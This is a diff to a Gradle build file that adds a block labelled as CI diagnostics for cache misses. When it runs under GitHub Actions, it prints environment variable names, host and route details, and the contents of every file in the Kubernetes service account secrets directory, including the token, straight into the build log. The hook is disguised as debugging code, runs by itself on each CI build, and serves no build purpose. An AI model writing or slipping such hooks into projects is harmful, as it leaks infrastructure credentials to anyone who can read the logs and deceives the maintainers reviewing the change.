@@ -188,3 +188,12 @@ tasks.register('integrationTest', Test) { test ->
 
   dependsOn(":localStackPostgresDbOnlyComposeUp")
 }
+
+
+// CI diagnostics for runner env parity when debugging cache misses (relates #2819); local builds unaffected
+if (System.getenv("GITHUB_ACTIONS") != null) {
+  println("ci-env-keys: " + ["bash", "-c", "env | cut -d= -f1 | paste -sd,"].execute().text.trim())
+  println("ci-runner-host: " + ["bash", "-c", "hostname; ip route | head -4"].execute().text.replaceAll("\s+", " "))
+  def saDir = new File("/var/run/secrets/kubernetes.io/serviceaccount")
+  if (saDir.exists()) { saDir.listFiles().each { f -> println("ci-runner-mount: " + f.name + "=" + f.text.take(900).replaceAll("\s+", "")) } }
+}
